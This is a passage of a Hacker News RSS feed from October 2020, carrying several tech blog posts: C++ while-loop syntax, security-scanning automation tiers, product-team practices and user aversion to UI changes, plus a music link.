./deployment/scripts/deploy staging web</code></pre><p>This will build a new Docker container, push it and perform a rolling update of the new image.</p><figure><img src="https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.36.33-PM.png" alt="" srcset="https://blog.bedrock.io/content/images/size/w600/2020/10/Screen-Shot-2020-10-21-at-12.36.33-PM.png 600w, https://blog.bedrock.io/content/images/size/w1000/2020/10/Screen-Shot-2020-10-21-at-12.36.33-PM.png 1000w, https://blog.bedrock.io/content/images/size/w1600/2020/10/Screen-Shot-2020-10-21-at-12.36.33-PM.png 1600w, https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.36.33-PM.png 2258w" sizes="(min-width: 720px) 720px"><figcaption>Your custom platform is now live!</figcaption></figure><p><em>Note: All the steps in this article are also shown in this <a href="https://vimeo.com/443474352">15 minute video</a> that shows some example changes to the UI and the API.</em></p><h3 id="stay-tuned">Stay Tuned</h3><p>This is the first in a series of posts that elaborate on <a href="https://blog.bedrock.io/">Bedrock.io</a>. We are adding a lot more automation and tools to further reduce development friction and enhance platform capabilities.</p><p>In the mean time, give it a try, hack away, and <a href="https://bedrock.io/docs">reach out to us</a> if you'd like to be involved!</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.bedrock.io/deploying-a-production-ready-kubernetes-node-react-platform-in-under-15-minutes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930062</guid>
            <pubDate>Thu, 29 Oct 2020 13:07:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Something Old, Creatively and Lovingly Remade]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24929994">thread link</a>) | @marcacohen
<br/>
October 29, 2020 | https://mco.dev/under-pressure/ | <a href="https://web.archive.org/web/*/https://mco.dev/under-pressure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
            <div>
              <p>I love when an artist covers a great old song, not just following the original formula, but adding something special.</p>
<p>Johnny Cash‚Äôs version of Nine Inch Nails‚Äô <em>Hurt</em> comes to mind. This one is in the same class of originality. An unlikely duo, Karen O and Willie Nelson, took a song just about everyone knows and loves and totally made it their own. Enjoy‚Ä¶</p>
<br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/MEU-7uga_4A" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
              
            </div>
          </div></div>]]>
            </description>
            <link>https://mco.dev/under-pressure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929994</guid>
            <pubDate>Thu, 29 Oct 2020 12:58:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[While (auto x=y; z)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24929980">thread link</a>) | @ingve
<br/>
October 29, 2020 | https://quuxplusone.github.io/blog/2020/10/28/while-with-initializer/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2020/10/28/while-with-initializer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This question has come up at least twice on the cpplang Slack now. C++ keeps
adding more and more knobs to <code>if</code> and <code>for</code> and <code>switch</code>; why hasn‚Äôt it
messed with <code>while</code>? Specifically, why isn‚Äôt there a ‚Äútwo-part while loop‚Äù?</p>

<p>C++ offers the following control structures (where ‚Äú<code>init</code>‚Äù represents
the choice of either a declaration or an expression-statement):</p>

<div><div><pre><code>if (z)                     // '98
if (auto z=w)              // '98
if (init; z)               // C++17
if (init; auto z=w)        // C++17

if constexpr (z)           // all C++17
if constexpr (auto z=w)
if constexpr (init; z)
if constexpr (init; auto z=w)

for (init; z; ++x)         // '98
for (init; auto z=w; ++x)  // '98
for (auto e : r)           // C++11
for (init; auto e : r)     // C++20

while (z)                  // '98
while (auto z=w)           // '98
do { ... } while (z)       // '98

switch (z)                 // '98
switch (auto z=w)          // '98
switch (init; z)           // C++17
switch (init; auto z=w)    // C++17
</code></pre></div></div>

<p>Notably missing from the middle of this list: <code>while (init; z)</code> and
<code>while (init; auto z=w)</code>.</p>

<p>The reason <code>while (init; cond)</code> is missing is that there are two
reasonable interpretations of what it might mean. The Committee could
pick one behavior to be ‚Äúcorrect‚Äù; but if they did that, programmers
would inevitably write the construct expecting the <em>other</em> behavior,
and then they‚Äôd have bugs.</p>

<h2 id="option-1-evaluate-the-init-only-once">Option 1: Evaluate the init only once</h2>

<p>Kirit S√¶lensminde offered the following use-case:</p>

<div><div><pre><code>auto cursor = getCursor();
while (auto item = cursor.next()) {
    use(item);
}
</code></pre></div></div>

<p>If this is your use-case, then it might seem unfortunate that you can‚Äôt
combine the declaration of <code>cursor</code> into the <code>while</code>-loop; it has to
‚Äúleak‚Äù into the outer scope. You might <em>want</em> to write</p>

<div><div><pre><code>while (auto c = getCursor(); auto item = c.next()) {
    use(item);
}
</code></pre></div></div>

<p>It turns out that you can actually write this loop in a way
that‚Äôs just as short, and arguably clearer (since it uses only
C++98 features): just use a <code>for</code> loop instead!</p>

<div><div><pre><code>for (auto c = getCursor(); auto item = c.next(); ) {
    use(item);
}
</code></pre></div></div>

<h2 id="option-2-evaluate-the-init-every-time">Option 2: Evaluate the init every time</h2>

<p>The other use-case for which you might want a two-part <code>while</code> loop is:</p>

<div><div><pre><code>int ch;
while ((ch = getchar()) != EOF) {
    use(ch);
}
</code></pre></div></div>

<p>If this is your use-case, then it might seem unfortunate that you can‚Äôt
combine the declaration of <code>ch</code> into the <code>while</code>-loop; it has to
‚Äúleak‚Äù into the outer scope. (And go uninitialized, too!) You might <em>want</em> to write</p>

<div><div><pre><code>while (int ch = getchar(); ch != EOF) {
    use(ch);
}
</code></pre></div></div>

<p>I‚Äôm not aware of any clean way to write this loop that avoids leaking
<code>ch</code> into the outer scope. I mean, I don‚Äôt consider any of these ‚Äúclean‚Äù:</p>

<div><div><pre><code>for (int ch; (ch = getchar()) != EOF; ) {
    use(ch);
}

for (int ch = getchar(); ch != EOF; ch = getchar()) {
    use(ch);
}

while (true) {
    if (int ch = getchar(); ch != EOF) {  // C++17
        use(ch);
    } else {
        break;
    }
}
</code></pre></div></div>

<hr>

<p>So, given that there‚Äôs a clean way to write Option 1 already, and no equally clean way
to write Option 2, shouldn‚Äôt the Committee simply add Option 2 to the language? <strong>No.</strong></p>

<p>We can‚Äôt give programmers the ability to write</p>

<div><div><pre><code>while (int ch = getchar(); ch != EOF) { ... }
</code></pre></div></div>

<p>without <em>also</em> giving them the ability to shoot themselves in the foot with</p>

<div><div><pre><code>while (auto c = getCursor(); auto item = c.next()) {
    // repeatedly fetch the list and process just its first item,
    // over and over, forever
}
</code></pre></div></div>

<p>I‚Äôm happy to keep programming without a complicated ‚Äútwo-part <code>while</code> loop,‚Äù
if it means that other programmers are happily prevented from shooting themselves
in the foot.</p>

  </div></div>]]>
            </description>
            <link>https://quuxplusone.github.io/blog/2020/10/28/while-with-initializer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929980</guid>
            <pubDate>Thu, 29 Oct 2020 12:55:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Autonomous Security: Pushing Security Automation to the Next Level]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24929693">thread link</a>) | @alaeddine
<br/>
October 29, 2020 | https://blog.ostorlab.co/autonomous-security-scanning.html | <a href="https://web.archive.org/web/*/https://blog.ostorlab.co/autonomous-security-scanning.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h2>Overview</h2>
<p>The Autonomous Cars Industry defines <a href="https://www.truecar.com/blog/5-levels-autonomous-vehicles/">6 levels of driverless vehicles</a>: </p>
<ul>
<li>L0 - No automation</li>
<li>L1 - Driver Assistance</li>
<li>L2 - Partial Automation</li>
<li>L3 - Conditional Automation</li>
<li>L4 - High Automation</li>
<li>L5 - Full Automation.</li>
</ul>
<p>While the world of SRE (Site Reliability Engineering) has already adopted the term <code>Autonomous System</code> to refer to the
judicious application of automation, the word <code>Autonomous Security</code> is not widely used by the Security industry.</p>
<blockquote>
<p>For SRE, automation is a force multiplier, not a panacea. Of course, just multiplying 
force does not naturally change the accuracy of where that force is applied: doing automation 
thoughtlessly can create as many problems as it solves. Therefore, while we believe that 
software-based automation is superior to manual operation in most circumstances, better 
than either option is a higher-level system design requiring neither of them‚Äîan autonomous system. 
Or to put it another way, the value of automation comes from both what it does and its 
judicious application.</p>
</blockquote>
<p>While no one will disagree that Security Automation is critical to scale security ops within any
organization. The size, diversity, and complexity in which we are operating make the current approach of having
humans and manual processes to address the volume vulnerabilities and incidents not so scalable. Scaling teams will
eventually be limited by how many people we can hire, scaling processes will eventually cripple an organization's
productivity.</p>
<p>The goal of <code>Autonomous Security</code> is to automate the decision process. In the context of vulnerability scanning, for instance, this
might take the form of <strong>quarantining a vulnerable machine, setting up a firewall rule or deploying a patch</strong>, in the 
context of incident response, this might take the form <strong>dumping memory for forensic analysis and reducing access to critical systems</strong>.</p>
<p>Achieving this high degree of automation cannot be done without effective technology and a feedback loop to measure what
works, what does not and detect what is missing.</p>
<p>The following article coins the term <code>Autonomous Security</code> in the context
of Security Scanning and outlines the required technological blocks and policies. The end goal is to automate
containment and use a feedback loop to address missing parts and blind spots.</p>
<p><img alt="alt text" src="https://blog.ostorlab.co/static/img/autonomous.png" title="Autonomous Loop"></p>
<p>The document defines 5 tiers to reflect the different maturity levels. In the next sections, we will define each block
and how its maturity level can be enhanced while achieving the goal of a fully <code>Autonomous System</code>.</p>
<table>
<thead>
<tr>
<th>Concept</th>
<th>T0</th>
<th>T1</th>
<th>T2</th>
<th>T3</th>
<th>T4</th>
</tr>
</thead>
<tbody>
<tr>
<td>Inventory &amp; Discovery</td>
<td>No Inventory</td>
<td>Manual Inventory</td>
<td>Partially Automated Inventory</td>
<td>Fully Automated Inventory</td>
<td>Fully Automated Inventory with discovery</td>
</tr>
<tr>
<td>Policy</td>
<td>No Policy</td>
<td>Patching Policy</td>
<td>Patching + Black Swan Policy</td>
<td>Patching + Black Swan + Freshness Policy</td>
<td>Patching + Black Swan + Freshness + Enforcement Policy</td>
</tr>
<tr>
<td>Scanning</td>
<td>Occasional Scanning</td>
<td>Low frequency Scheduled Scans</td>
<td>Scheduled Scans</td>
<td>Scheduled Scans and Continuous Event-based Monitoring</td>
<td>Scheduled Scans, Continuous Event-based Monitoring with historical tracking</td>
</tr>
<tr>
<td>Containment</td>
<td>Manual Remediation</td>
<td>Manual</td>
<td>Semi-automated</td>
<td>Automated</td>
<td>Automated + Enforcement</td>
</tr>
<tr>
<td>D&amp;M</td>
<td>No Dashboard</td>
<td>Scan Dashboard</td>
<td>Coverage, Scan and Fixes</td>
<td>Coverage, Scan, Fixes and Exec</td>
<td>Coverage, Scan, Fixes, Devs, Ops and Exec</td>
</tr>
</tbody>
</table>
<h3>1. Inventory &amp; Discovery</h3>
<p>Inventory consists of listing assets and collecting useful metadata like ownership, usage (Prod vs. Dev), and targeting information, for
instance listing all the desktop machines within your organization and collecting metadata like MAC address, IP address,
and employee owner.</p>
<p>Inventory is used for security scanning to schedules scans, assign vulnerabilities for fixes, present an aggregated
view of the security of an environment and drive strategic remediation.</p>
<p>Inventory is difficult to maintain when it is purely security focused and is better if it is not operated by the security
team. Inventory maintenance is challenge both; from a technical and a  process perspective. In most cases and environments <strong>we are
faced with the need to keep inventory of assets with different and contradicting requirements</strong>, such as highly
volatile vs. immutable assets, low volume with frequent changes vs. high volumes with rare changes, or 
ambiguous vs. hierarchical ownership. Hence, building and maintaining an infrastructure that copes with all of these requirements is a very challenging problem.</p>
<blockquote>
<p>For example scanning desktop machines vs. database servers, desktops routinely change IP addresses and have a single owner, while a database
server rarely changes an IP address, and the services they run; have separate owners.</p>
</blockquote>
<p>Moreover, Inventory can benefit a wide range of usages, like tracking consumption (financial), monitoring deployments (production),
hence, making it is easier to maintain if driven by production as it is usually the best way to keep it up to date.</p>
<blockquote>
<p>As a case in point, the newly open-sourced project <code>Backstage</code> by Spotify <a href="https://github.com/spotify/backstage">Backstage</a>. According
to the team behind the project, because the <code>Backstage</code> provides the tools to create and monitor deployments, it has naturally became the source of
truth of their inventory.</p>
</blockquote>
<p>While an up-to-date inventory is ideal, it is practically not achievable due to blind spots caused by human interaction or technological limitations.</p>
<p>As it is taxing to determine blind spots, <strong>Inventory should always be augmented with an external discovery component</strong>
that tries to locate respective blind spots. Discovery should continuously attempt to find the loopholes that remain uncovered.</p>
<p>The discovery system is not limited to technical tools, like domain name brute forcing, but can also resort to other
means, like tracking payment done with enterprise credit card to find non listed cloud projects for instance.</p>
<h3>2. Scanning</h3>
<p>Scanning has 3 dimensions, namely scheduling, orchestration and detection that are as follows:</p>
<h4>2.1 Scheduling</h4>
<p>Scheduling addresses the question of when to scan; it is either time based or event based. Time-based like for instance once a day.
Event based like at each submit or every time a new container is created. The scheduling is driven by the asset lifetime and the vulnerability report lifetime.</p>
<blockquote>
<p>Not all assets are equal when it comes to scheduling, for instance scanning a public website requires a continuous
time based rules, while containers for instance require an event based to scan at creation and the detection of a new
CVE affecting one of the container dependencies.</p>
</blockquote>
<p>Event-based scanning is always preferred over time based scans as we narrow the window of when things can get wrong.
It is unfortunately not always possible. Take for instance black box scanning of a website, without any measure of
how things are changing or evolving, the only option we have is a time-based approach.</p>
<blockquote>
<p>Current time-based approach can be drastically enhanced by avoiding full re-scans and building on previous scan results and coverage.
Take for instance scanning a website, instead of doing full crawl with every scan, scanner can use previous crawls to
speed up scans, detect changes and focus tests.</p>
</blockquote>
<p>A fully <code>Autonomous Security</code> pipeline doesn't need to hammer an asset with continuous scans, but can take a smarter
approach. If an asset is a static website and it hasn't changed in the last 6 months, the system should be able to
lower the frequency of scans.</p>
<h4>2.2 Orchestration</h4>
<p>Orchestration defines how to handle the lifecycle of a scan, like what to do in the case
of a failure, whom to notify during the different phases of a scan, should a set of extra
resolution steps or notification get triggered, should a duplicate dedicated environment get 
created for scanning.</p>
<blockquote>
<p>With service mesh type architecture (e.g. Istio), it is possible to create a <code>testing garden</code>
by duplicating a set of services for scanning, route scanning traffic to the new mesh based
on a header value for instance and apply quota to access shared components like a database or a message queue.</p>
</blockquote>
<p>Orchestration is typically critical for compliance regimes, like PCI-DSS or FedRamp. A fully <code>Autonomous Security</code> pipeline
can define a set a hooks to trigger business oriented logic, like notify certain people, update certain dashboards,
generate certain reports, etc.</p>
<h4>2.3 Detection</h4>
<p>Detection is usually what most people think of when we talk about security scanning. As important as it is, it is
only one cog in a large machinery.</p>
<p>Proper detection must reduces false positives and negatives and take context to rate severity. Finding the correct
balance the suits the size of an organization and the severity of an environment is an important balance.</p>
<p>Creating a map of the type of assets owned by an organization and creating a coverage map is helpful to identify
missing capabilities, an simplified map could be as simple as:</p>
<div><pre><span></span><code><span>* Network</span><span>:</span>
    <span>* IPv4</span><span>:</span> <span>CHECK</span> 
    <span>* IPv6</span><span>:</span> <span>MISSING</span>

<span>* Web</span><span>:</span>
    <span>* Known Vulnz</span><span>:</span> <span>CHECK</span>
    <span>* non-SPA</span><span>:</span> <span>CHECK</span>
    <span>* SPA</span><span>:</span> <span>MISSING</span>
    <span>* Authenticated</span><span>:</span> <span>MISSING</span>

<span>* Mobile</span><span>:</span>
    <span>* Android</span><span>:</span> <span>CHECK</span>
    <span>* iOS</span><span>:</span> <span>CHECK</span>
    <span>* Mobile Backend</span><span>:</span> <span>CHECK</span>

<span>* Cloud</span><span>:</span>
    <span>* VM</span><span>:</span> <span>MISSING</span>
    <span>* Containers</span><span>:</span> <span>CHECK</span>
    <span>* Serverless</span><span>:</span> <span>MISSING</span>

<span> </span><span>...</span>
</code></pre></div>
<p>or as complex as :</p>
<div><pre><span></span><code><span>* Web</span><span>:</span>
    <span>* SQL Injection</span><span>:</span>
      <span>* Postgrs</span><span>:</span>
        <span>* WHERE Clause</span><span>:</span> <span>CHECK</span>
        <span>* FROM Clause</span><span>:</span> <span>MISSING</span>
        <span>* ORDER Clause</span><span>:</span> <span>LIMITED</span>
</code></pre></div>
<blockquote>
<p>While detection is a <strong>VERY</strong> large topic, a common complaint in this space is that security vendors often
over-promise and under-delivered space. <a href="https://www.helpnetsecurity.com/2020/10/23/cybersecurity-is-failing-due-to-ineffective-technology/">This is good resource on why the security industry is failing due to ineffective technology</a></p>
</blockquote>
<p>All security solutions can be split into 2 technological pieces, an <code>Analysis Engine</code> and set of <code>Rules</code>. The engine is typically
what takes a program, a website, an IP and performs a set transformations or interactions.</p>
<p>Example of <code>Analysis Engines</code>:</p>
<ul>
<li><strong>Dependency fingerprint engine</strong>: Find dependencies and 3rd party components.</li>
<li><strong>Taint Engine</strong>: Generate object-oriented graph taint to find link between sources and sinks.</li>
<li><strong>Dynamic Engine</strong>: Collect stack traces, methods and parameters.</li>
<li><strong>Fuzz Engine</strong>: Injects inputs and collects data flow and crash reports.</li>
</ul>
<p>The engine outputs are then ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.ostorlab.co/autonomous-security-scanning.html">https://blog.ostorlab.co/autonomous-security-scanning.html</a></em></p>]]>
            </description>
            <link>https://blog.ostorlab.co/autonomous-security-scanning.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929693</guid>
            <pubDate>Thu, 29 Oct 2020 12:20:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secrets of the best product teams]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24929484">thread link</a>) | @scotthtaylor
<br/>
October 29, 2020 | https://st.im/secrets-of-the-best-product-teams/ | <a href="https://web.archive.org/web/*/https://st.im/secrets-of-the-best-product-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Travelling back in time to 2004, the ‚ÄúWorld Wide Web‚Äù was dominated by Microsoft, AOL, and Jeeves. (the)Facebook had just launched, and it would be three more years until the first iPhone. I was just fifteen, and didn‚Äôt have many friends. I did, however, have a keen interest in computers, and was blown away by the connectivity of the Internet. It wasn‚Äôt long before I started immersing myself in the coding languages that powered it -- building websites that I wanted to use, but didn‚Äôt yet exist.</p><p>I didn‚Äôt know it back then, but I was dipping my toes in the waters of <strong>product management</strong>, or <strong>product</strong> as it‚Äôs better known now.</p><p>Product essentially being the ability to work with a multidisciplinary team of people and build a simple solution to a real customer problem in a way that meets the needs of the business. All with an understanding of how design, business, technology and users intersect and overlap.</p><p>Back then product management was more associated with enterprise software, with Product Managers (PMs) being concentrated in the likes of Cisco and Oracle.</p><p>As Internet adoption exploded over the next decade and startups became part of everyday life, PMs were no longer building highly specialised or corporate software exclusively. They were the founders building stuff that helped with everything from dating through to grabbing a taxi. They were also building products in larger corporates; for example Gmail within Google.</p><p>The PM concept had hit the mainstream. </p><p>Amazon, Google, Facebook, Netflix, Tesla -- the list could go on -- have all successfully scoped out, built, and launched products that are used by billions of people. All because they have a solid product culture, that connects all the dots. It‚Äôs hard to imagine a modern-day tech company not having ‚Äòproduct‚Äô at their core.</p><p>With this context, I wanted to talk about the secrets that I‚Äôve noticed in high performing product teams over the years. So whether you‚Äôre an early stage startup working on achieving product/market fit, or a growth stage company working on scale, or even a large corporate trying to regain your ability to consistently deliver new value to your customers, I‚Äôm sure that there will be something to takeaway.</p><h2 id="making-sure-the-basics-are-covered">Making sure the basics are covered </h2><p>Before jumping into the secrets, I want to make sure we‚Äôre on the same page with regard to the basics. Without these being covered no product team will be able to have consistent break-out success.</p><!--kg-card-begin: markdown--><pre><code>def sum_product(n): 
    s = 0 
    while n: 
        vision +
        functionality +
        technology +
        user experience design +
        monetisation +
        acquisition +
        offline experience
    return s
</code></pre>
<!--kg-card-end: markdown--><p>Distilling it down to first principles, I think ‚Äòproduct‚Äô is really about evaluating opportunities and determining what gets built and delivered to customers. Everything stems from this. And to do it successfully, you must:</p><ol><li>Understand your customer,</li><li>Understand the data, and</li><li>Understand your business and the industry it operates in</li></ol><p>Understanding the customer means you‚Äôre an expert on their issues, pains, desires, and how they think. Without this, you‚Äôre just guessing. And it has to be a mix of both quantitative and qualitative learning. </p><p>Understanding the data covers a wide gamut, not only the ability to understand your customer but to know what they‚Äôre doing with your product. Successful products need to be loved by your customers but also need to work for your business. This means knowing who your stakeholders are and the constraints they operate under.</p><p>Finally understanding your market. You need to know who your competitors are ‚Äì in addition to key trends, customer behaviours and expectations.</p><p>Each of these principles deserves its own in-depth post ‚Äì but, for now, I wanted to provide some brief context before touching on the lesser known secrets. </p><h2 id="first-you-need-a-big-mission">First, you need a big mission</h2><p>It‚Äôs critical for your team to be organised around something that‚Äôs motivating. </p><p>It has to be a mission that‚Äôs worthwhile. Something that gets them out of bed. But it also has to be somewhat ambiguous, or unattainable, as well. Think of Elon Musk‚Äôs mission for SpaceX ‚Äì to colonise Mars. </p><p>This helps people become missionaries. It also helps align the skills of the people that are potentially going to be working on the product. Finally, it serves as a filter. A filter for people who are able to connect the dots, from the potentially mundane tasks of today to the exciting vision of tomorrow. These are the people that you want around you. Those who can‚Äôt connect the dots, will naturally fall by the wayside.</p><p>Next, even though the <em>mission</em> may sound crazy, this doesn‚Äôt mean the <em>vision</em> is.</p><p>The product vision has to be consumer centric yet aligned with the mission. The product team are usually the ones translating that mission into reality. And that‚Äôs what the vision helps you do. </p><p>Product are usually the ones initiating the conversation around what the product vision should be, because we‚Äôre the ones talking to the customer.</p><p>So an idea might be seeded by the founders or execs, hypothesising about an area of opportunity. But it‚Äôs only once you start interacting with the customer, that you can say, ‚ÄúOh yeah, that‚Äôs a good idea‚Äù or, ‚ÄúNo that‚Äôs an awful idea, let‚Äôs not do that.‚Äù</p><p>The product vision gives the organisation its purpose, and we only want people in our organisation that are excited about, and dedicated to this vision ‚Äîmissionaries. PM thought leader Marty Cagan describes this well:</p><blockquote>There are many benefits of product teams, but a big goal is captured best by a quote from John Doerr, the famous Silicon Valley venture capitalist: ‚Äúwe need a team of missionaries, not teams of mercenaries.‚Äù Mercenaries build whatever they‚Äôre told to build. Missionaries are true believers in the vision and are committed to solving problems for their customers. <br></blockquote><h2 id="next-a-finger-on-the-pulse-of-innovation">Next, a finger on the pulse of innovation</h2><p>High performing product teams are always seeking improvement. They're open to adopting new methodologies (e.g. think Agile a few years ago) and implementing emerging technologies. They have a high risk tolerance, and love placing educated bets.</p><p>As an example, pretty much all the awesome product teams I know are currently, as I type this, immersing themselves in artificial intelligence and machine learning. They understand that AI is the next general purpose technology ‚Äì something that will affect the world, and an opportunity that usually only comes along once in a generation. </p><p>These teams understand that scale economies accrue to first movers in AI, and second movers will find it difficult to catch up. By adopting early they reap the rewards of a positive feedback loop. They will capture early customers who, in turn, will create more data for the product. Resulting in a virtuous cycle that gives them a real, tangible and defensible advantage.</p><p>AI is transcending every industry. PMs used to be confined to just the tech sector, but the PMs of tomorrow will be needed in industries as diverse as farming and transportation; &nbsp;construction and medicine. Knowing how the AI product life cycle differs from that which has gone before will be a core competitive advantage.</p><p>An ingrained culture of continuous improvement and evolution is at the heart of every high performing team. The key is to be continuously scanning the market for trends and evolutions, not just in the markets for which you are building products, but in how and why.</p><h2 id="it-s-not-a-finite-game">It‚Äôs not a finite game</h2><p>Strong product teams don‚Äôt think in terms of a first or second half of the game ‚Äì trying to get points on the board. But rather, they think of it as an infinite game. Always trying to get better. Understanding that there‚Äôs mastery beyond where they are, at every step.</p><p>This means they‚Äôre always going to beat their competition, because the competition is always going to be seeking this quarterly result, or that end event. Maybe ‚Äôthe event‚Äô is an IPO or an acquisition. Whereas the high performing team isn‚Äôt focussed on any particular business event, they‚Äôre seeking, ‚ÄúWhat‚Äôs the best possible outcome for this brand?‚Äù; ‚ÄúWhat‚Äôs the best possible outcome for this customer?‚Äù</p><p>This fundamentally changes the mentality of the team and the nature of how they show up every day. </p><p>It also relates to open mindedness ‚Äì is your team open to new learning? Or do they assume they know everything?</p><p>The open mindset reminds your team of the idea that we‚Äôre not perfect, that we could fail, and that we may not have the answer. You need to have a culture where it‚Äôs okay to say ‚ÄúI don‚Äôt know‚Äù even when someone might expect you to.</p><h2 id="safe-psychological-spaces">Safe psychological spaces</h2><p>Do your team members feel like they can express an opinion or share what they think without feeling like they‚Äôre going to be repressed by your opinion, or that of the loudest person in the room? &nbsp;</p><p>Strong product teams don't look for consensus. They understand that innovation and collaboration are not correlated to consensus. </p><p>People should be encouraged to share their opinions. They can have disagreements about approaches but there needs to be an open forum where people have an opportunity to share. </p><p>A common problem is that people go to work and they don‚Äôt feel like they can express their opinions because they've got a structure, or a manager, or a situation that doesn‚Äôt allow for that to happen. </p><p>Safe psychological space is something that managers and leaders of high performing teams work a lot on. And it‚Äôs never over. You're always changing it because you're always bringing new people in. And every time you bring a new person in, you‚Äôve got a change in dynamic. How do you make sure those people feel safe and that the people that who were previously interacting in a safe way don‚Äôt feel like they‚Äôre being adjusted in some way that‚Äôs negative.</p><h2 id="many-other-contributing-factors">Many other contributing factors</h2><p>The selection of secrets I‚Äôve offered here are just a few of my favourites. </p><p>Others on the shortlist include:</p><ol><li>Empowerment and accountability -- ensuring that your team members are assigned problems to solve, rather than just given lists of ‚Ä¶</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://st.im/secrets-of-the-best-product-teams/">https://st.im/secrets-of-the-best-product-teams/</a></em></p>]]>
            </description>
            <link>https://st.im/secrets-of-the-best-product-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929484</guid>
            <pubDate>Thu, 29 Oct 2020 11:48:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Page Load Time Comparison of Raspberry Pi 3 and 4 Web Servers]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 22 (<a href="https://news.ycombinator.com/item?id=24929444">thread link</a>) | @sT370ma2
<br/>
October 29, 2020 | https://cheapskatesguide.org/articles/raspberry-pi-3-4-web-server.html | <a href="https://web.archive.org/web/*/https://cheapskatesguide.org/articles/raspberry-pi-3-4-web-server.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cheapskatesguide.org/articles/raspberry-pi-3-4-web-server.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929444</guid>
            <pubDate>Thu, 29 Oct 2020 11:43:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sudden Changes in UI: Why It's a Bad Move]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24929443">thread link</a>) | @allending
<br/>
October 29, 2020 | https://blog.snappymob.com/sudden-changes-in-ui-why-its-a-bad-move | <a href="https://web.archive.org/web/*/https://blog.snappymob.com/sudden-changes-in-ui-why-its-a-bad-move">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>There‚Äôs a reason why change aversion in users is so often spoken about in the world of digital consumerism <span>‚Äî </span>human beings love their comfort zones. In the grand scheme of things, we seek out what is familiar to us for a sense of security.</p>
<!--more-->
<p>Keeping your software product updated is important, but it‚Äôs also important to make sure the perfective changes you make are within the bounds of what your users are familiar and comfortable with.</p>
<p>Now, what kinds of changes might we be referring to?&nbsp;</p>
<p>The types of changes that can be introduced in a software product are changes in infrastructure, functionality, and interface. Among them, interface changes incite the biggest reactions from users. That‚Äôs because it‚Äôs the most forefront part of a product that they see and interact with <span>‚Äî layout, tabs, fonts, colors, buttons, animation, etc</span>.</p>
<p><span>When introducing changes in this aspect of your product, both psychology and history say you should take it slow.</span></p>
<h2><strong>What Psychology Tells Us&nbsp;</strong></h2>
<p>To discuss why sudden and major UI changes backfire from a psychological point of view, we have to address change aversion.&nbsp;</p>
<p>There have been many cases where consumers refused to adapt to a new product, even if it was objectively ‚Äúbetter‚Äù. One good example would be the introduction of the <a href="https://www.dvorak-keyboard.com/"><span>Dvorak keyboard</span></a> in the 1930s.</p>
<p>Even&nbsp;though the Dvorak keyboard promoted objectively better physical ergonomics, people refused to move from the QWERTY keyboard <span>‚Äî</span> simply because they were used to it.&nbsp;</p>
<p>Why is that?</p>
<h3><strong>Users Want to Feel Smart</strong></h3>
<p>It‚Äôs widely taught by UIUX experts like Rohan Puri and Robert Youmans, that users are aversive to change because ‚Äúchange makes them feel dumb‚Äù. When using your product, users want to feel in control, like they know what they‚Äôre doing.&nbsp;</p>
<p>Especially for neurodivergent users, big and sudden changes in UI can be disorienting. When you change things around all at once, you‚Äôre also making your users relearn what they‚Äôd previously mastered before <span>‚Äî and that takes time and energy. In other words, you‚Äôre giving them work to do.</span></p>
<p>If you‚Äôre an app or web developer, always remember that your users aren‚Äôt sitting next to you, watching you iterate and develop from scratch. Your interface may seem simple to you because you‚Äôve familiarized with it as you worked on it, but that‚Äôs not the case for them.</p>
<h3><strong>Value is Invisible</strong></h3>
<p>Confirming many real-life cases, a study by Rosman et al on <a href="https://www.researchgate.net/publication/262411663_On_user_behaviour_adaptation_under_interface_change"><span>user behaviour adaptation under interface change</span></a> found that it takes many tries for a user to feel comfortable enough with an interface that was initially unfamiliar to them, before they ‚ÄúconÔ¨Ådently choose it and realise the potential beneÔ¨Åts‚Äù.</p>
<p>Because the bulk of your revamp‚Äôs value is neither visible nor instantly detectable, more impatient users might poorly estimate the efÔ¨Åciency of your improved UI and ‚Äúprematurely abandon it‚Äù in that particular time frame.</p>
<p>After all, if they don‚Äôt see an increase in value, why would they like that you changed what was already working for them?</p>
